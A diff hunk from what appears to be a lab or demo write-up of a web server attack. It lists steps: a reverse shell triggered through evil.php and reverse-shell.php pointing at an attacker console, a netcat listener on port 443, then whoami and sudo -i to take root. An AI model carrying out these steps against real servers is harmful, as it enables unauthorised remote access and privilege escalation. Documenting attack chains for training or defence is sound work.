@@ -14,7 +14,7 @@ The Attack
 >9. From evil.php on ubuntu-web-pr Get Reverse Shell - See Reverse Shell Wget
 >10. On Remote Attack Console Box Open NetCat Listeners 
 >	- Terminal #1 - nc -nvlp 443
->11. Web Browser Tab #1 to http://<ubuntu-web-pr>/reverse-shell.php?ip=<consoleIP>&port=443
+>11. Web Browser Tab #1 to http://ubuntu-web-pr/reverse-shell.php?ip=consoleIP&port=443
 >12. On ubuntu-web-pr - whoami
 >13. On ubuntu-web-pr - sudo -i
 >14. On ubuntu-web-pr - whoami
